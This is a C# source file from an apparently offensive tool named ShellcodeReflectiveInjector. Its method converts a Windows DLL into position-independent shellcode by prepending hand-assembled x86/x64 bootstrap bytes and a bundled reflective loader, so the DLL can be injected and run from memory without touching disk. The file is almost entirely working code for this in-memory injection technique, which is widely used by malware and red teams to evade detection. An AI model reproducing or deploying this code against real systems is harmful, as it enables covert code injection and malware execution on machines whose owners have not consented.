using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using ShellcodeReflectiveInjector.Interop;

namespace ShellcodeReflectiveInjector.Library
{
    internal class Utilities
    {
        public static byte[] ConvertToShellcode(byte[] moduleBytes)
        {
            int nDllDataOffset;
            var bootcode64 = new byte[]
            {
                // _start:
                0xE8, 0x00, 0x00, 0x00, 0x00,       // call   <_prologue>
                // _prologue:
                0x59,                               // pop    rcx
                0x41, 0xB8, 0x00, 0x00, 0x00, 0x00, // mov    r8d, <_dll_data>
                0x4C, 0x01, 0xC1,                   // add    rcx,r8
                // _loader:
                //     <ReflectiveLoader code is here>
                // _dll_data:
                //     <DLL data is here>
            };
            var bootcode32 = new byte[]
            {
                // _start:
                0xE8, 0x00, 0x00, 0x00, 0x00,       // call   <_prologue>
                // _prologue:
                0x59,                               // pop    ecx
                0x81, 0xC1, 0x00, 0x00, 0x00, 0x00, // add    ecx, <_dll_data offset>
                0x55,                               // push   ebp
                0x89, 0xE5,                         // mov    ebp, esp
                0x51,                               // push   ecx
                0xE8, 0x02, 0x00, 0x00, 0x00,       // call   <_loader>
                0xC9,                               // leave
                0xC3,                               // ret
                // _loader:
                //     <ReflectiveLoader code is here>
                // _dll_data:
                //     <DLL data is here>
            };
            var shellcode = new List<byte>();

            if (Helpers.GetPeArchitecture(moduleBytes) == IMAGE_FILE_MACHINE.AMD64)
            {
                // Patch "mov r8d, <_dll_data>"
                nDllDataOffset = bootcode64.Length + Resources.x64Loader.Length - 5;
                Buffer.BlockCopy(BitConverter.GetBytes(nDllDataOffset), 0, bootcode64, 8, Marshal.SizeOf(typeof(int)));

                foreach (var code in bootcode64)
                    shellcode.Add(code);

                foreach (var code in Resources.x64Loader)
                    shellcode.Add(code);
            }
            else if (Helpers.GetPeArchitecture(moduleBytes) == IMAGE_FILE_MACHINE.I386)
            {
                // Patch "add ecx, <_dll_data offset>"
                nDllDataOffset = bootcode32.Length + Resources.x86Loader.Length - 5;
                Buffer.BlockCopy(BitConverter.GetBytes(nDllDataOffset), 0, bootcode32, 8, Marshal.SizeOf(typeof(int)));

                foreach (var code in bootcode32)
                    shellcode.Add(code);

                foreach (var code in Resources.x86Loader)
                    shellcode.Add(code);
            }

            if (shellcode.Count > 0)
            {
                foreach (var code in moduleBytes)
                    shellcode.Add(code);
            }

            return shellcode.ToArray();
        }
    }
}
